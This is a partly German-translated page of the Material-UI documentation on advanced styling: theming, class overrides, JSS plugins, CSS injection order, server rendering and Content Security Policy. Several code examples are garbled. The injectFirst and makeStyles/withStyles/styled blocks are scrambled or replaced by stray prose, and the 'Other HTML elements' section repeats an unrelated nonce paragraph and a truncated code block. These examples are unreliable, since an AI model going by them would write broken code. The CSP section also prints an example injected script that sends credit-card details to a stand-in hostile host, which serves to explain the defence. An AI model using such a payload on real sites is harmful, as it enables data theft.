# Erweitert

<p class="description">This section covers more advanced usage of @material-ui/core/styles.</p>

## Theming

Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen: Das innere Theme ** überschreibt** das äußere Theme.

> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.

```jsx
import { ThemeProvider } from '@material-ui/core/styles';
import DeepChild from './my_components/DeepChild';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### Zugriff auf das Theme in einer Komponente

Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.

#### `useTheme` hook

For use in function components:

```jsx
import { useTheme } from '@material-ui/core/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

For use in class or function components:

```jsx
import { withTheme } from '@material-ui/core/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### Verschachtelung des Themes

Sie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## Überschreiben der Styles `classes` Eigenschaft

Die `makeStyle` (Hook-Generator) und `withStyles` (HOC) APIs ermöglichen die Erstellung mehrerer Stilregeln pro Stylesheet. Jede Stilregel hat einen eigenen Klassennamen. Die Klassennamen werden der Komponente mit der `classes` Variable zur Verfügung gestellt. Dies ist besonders nützlich, wenn Sie verschachtelte Elemente in einer Komponente formatieren.

```jsx
// Ein Stylesheet
const useStyles = makeStyles({
  root: {}, // eine Stil Regel
  label: {}, // eine verschachtelte Regel
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        verschachtelt
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

Die Klassennamen sind jedoch häufig nicht deterministisch. Wie kann eine übergeordnete Komponente den Stil eines verschachtelten Elements überschreiben?

### `withStyles`

Dies ist der einfachste Fall. Die umschlossene Komponente akzeptiert die `classes` Eigenschaft, welches einfach die mit dem Stylesheet gelieferten Klassennamen zusammengeführt wird.

```jsx
const Nested = withStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
})(({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      Nested
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### `makeStyles`

Die Hook-API erfordert etwas mehr Arbeit. Sie müssen die übergeordneten Eigenschaften als erstes Argument an den Hook übergeben.

```jsx
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## JSS-Plugins

JSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.

Nicht alle Plugins sind standardmäßig in der Material-UI verfügbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

Selbstverständlich können Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

export default function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}
```

## String-Vorlagen

Wenn Sie die CSS-Syntax gegenüber JSS bevorzugen, können Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) Plugin verwenden.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Beachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterstützt.

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## CSS-Injektionsreihenfolge

> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)

Standardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingefügt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.

### injectFirst

Der `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):

```jsx
*/}
</StylesProvider>
      import { StylesProvider } from '@material-ui/core/styles';

<StylesProvider injectFirst>
  {/* Your component tree. Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben.
```

### `makeStyles` / `withStyles` / `styled`

Das Einfügen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:

```jsx
Die nicht deterministische Natur der Klassennamen ermöglicht die Stilisolation.
  Sie müssen die <code>Klassen</code> Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben.
``` Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben.
</code>

Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.

### insertionPoint

JSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzufügen der Platzierung des `Einfügepunkts` innerhalb Ihres HTML-Heads können Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.

#### HTML-Kommentar

Am einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzufügen, der bestimmt, wo JSS die Stile einfügt:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

#### Other HTML elements

The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
```

#### JS createComment

codesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, können Sie die JavaScript `document.createComment()` API verwenden:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

## Server-Rendering

In diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/core/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).

### Gatsby

There is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.

Refer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.

### Next.js

Sie müssen über eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzufügen.

Siehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) für ein aktuelles Verwendungsbeispiel.

## Klassennamen

Die Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert.

### Standard

By default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Nehmen wir den folgenden Stil als Beispiel:

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

Dadurch wird ein Klassenname wie `makeStyles-root-123` generiert.

Sie müssen die `Klassen` Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben. Die nicht deterministische Natur der Klassennamen ermöglicht die Stilisolation.

- In der **Entwicklung** lauten der Klassenname: `.makeStyles-root-123` nach dieser Logik:

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### Mit `@material-ui/core`

Die generierten Klassennamen der `@material-ui/core` Komponenten verhalten sich anders. Wenn die folgenden Bedingungen erfüllt sind, sind die Klassennamen **deterministisch**:

- Es wird nur ein Themeanbieter verwendet (**Keine Verschachtelung von Themes**)
- The style sheet has a name that starts with `Mui` (all Material-UI components).
- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).

Diese Bedingungen werden bei den häufigsten Anwendungsfällen von `@material-ui/core` erfüllt. Zum Beispiel dieses Stylesheet:

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

generiert die folgenden Klassennamen, die Sie überschreiben können:

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*

Die Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) mühsam sein, wo Sie die classes Eingenschaft definieren müssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; 💔
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## Globales CSS

### `jss-plugin-global`

Das [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie können es verwenden, um globale Klassennamen zu definieren.

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### Hybrid

Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## CSS-Präfix

JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.

## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)

### Was ist CSP und warum ist es nützlich?

Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.

Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Wie kann man CSP implementieren?

Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.

Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können so erstellen:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
/>
```

Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann.

The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.

Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht. Here is an example of what a fictional header could look like:

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```